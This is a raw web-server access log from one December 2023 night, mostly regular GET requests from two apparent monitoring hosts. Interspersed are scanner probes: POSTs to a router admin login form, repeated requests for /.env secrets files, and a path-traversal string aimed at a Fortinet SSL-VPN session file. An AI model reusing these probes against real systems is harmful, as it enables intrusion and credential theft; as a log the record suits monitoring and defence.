159.203.109.206 - - [15/Dec/2023:03:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4689 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4690 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:03:15:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4691 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4692 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4693 "www@docker" "http://172.25.0.8:80" 0ms
2.56.247.167 - - [15/Dec/2023:03:16:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 308 18 "-" "-" 4694 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4695 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4696 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4697 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4698 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4699 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4700 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4701 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4702 "www@docker" "http://172.25.0.8:80" 0ms
162.243.151.9 - - [15/Dec/2023:03:20:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4703 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4704 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4705 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4706 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4707 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4708 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4709 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4710 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4711 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4712 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4713 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4714 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4715 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4716 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4717 "www@docker" "http://172.25.0.8:80" 0ms
2.56.247.167 - - [15/Dec/2023:03:27:19 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 308 18 "-" "-" 4718 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4719 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4720 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4721 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4722 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4723 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4724 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4725 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4726 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4727 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4728 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4729 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4730 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4731 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4732 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4733 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4734 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4735 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4736 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4737 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4738 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4739 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4740 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4741 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4742 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4743 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4744 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4745 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4746 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4747 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4748 "www@docker" "http://172.25.0.8:80" 0ms
119.13.157.184 - - [15/Dec/2023:03:42:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4749 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4750 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4751 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4752 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4753 "www@docker" "http://172.25.0.8:80" 1ms
91.92.243.232 - - [15/Dec/2023:03:44:09 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4754 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4755 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4756 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4757 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4758 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4759 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4760 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4761 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4762 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4763 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4764 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4765 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4766 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4767 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4768 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4769 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4770 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:03:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4771 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4772 "www@docker" "http://172.25.0.8:80" 0ms
57.129.23.166 - - [15/Dec/2023:03:52:50 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4773 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:03:52:50 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4774 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:03:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4775 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4776 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4777 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4778 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4779 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4780 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4781 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:03:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4782 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4783 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4784 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4785 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4786 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:03:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4787 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:03:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4788 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4789 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4790 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4791 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4792 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4793 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4794 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4795 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4796 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4797 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4798 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4799 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4800 "www@docker" "http://172.25.0.8:80" 0ms
2.56.247.167 - - [15/Dec/2023:04:05:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 308 18 "-" "-" 4801 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4802 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4803 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4804 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4805 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4806 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4807 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4808 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4809 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4810 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4811 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4812 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4813 "www@docker" "http://172.25.0.8:80" 1ms
91.92.243.151 - - [15/Dec/2023:04:12:02 +0000] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 19 "-" "-" 4814 "-" "-" 0ms
185.236.231.187 - - [15/Dec/2023:04:12:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4815 "web-to-websecure@internal" "-" 0ms
185.236.231.187 - - [15/Dec/2023:04:12:07 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4816 "web-to-websecure@internal" "-" 0ms
185.236.231.187 - - [15/Dec/2023:04:12:09 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4817 "-" "-" 0ms
185.236.231.187 - - [15/Dec/2023:04:12:10 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 4818 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4819 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [15/Dec/2023:04:12:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4820 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:04:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4821 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4822 "www@docker" "http://172.25.0.8:80" 0ms
198.199.103.95 - - [15/Dec/2023:04:13:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4823 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:04:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4824 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4825 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4826 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4827 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4828 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4829 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4830 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4831 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4832 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:04:18:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4833 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:04:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4834 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4835 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4836 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4837 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4838 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4839 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4840 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4841 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4842 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4843 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4844 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4845 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4846 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4847 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4848 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4849 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4850 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4851 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4852 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4853 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4854 "www@docker" "http://172.25.0.8:80" 0ms
78.153.140.219 - - [15/Dec/2023:04:28:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4855 "web-to-websecure@internal" "-" 0ms
78.153.140.219 - - [15/Dec/2023:04:28:36 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4856 "-" "-" 0ms
78.153.140.219 - - [15/Dec/2023:04:28:36 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4857 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:04:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4858 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4859 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4860 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4861 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4862 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4863 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4864 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4865 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4866 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4867 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:04:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4868 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:04:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4869 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:04:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4870 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:04:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4871 "www@docker" "http://172.25.0.8:80" 1ms
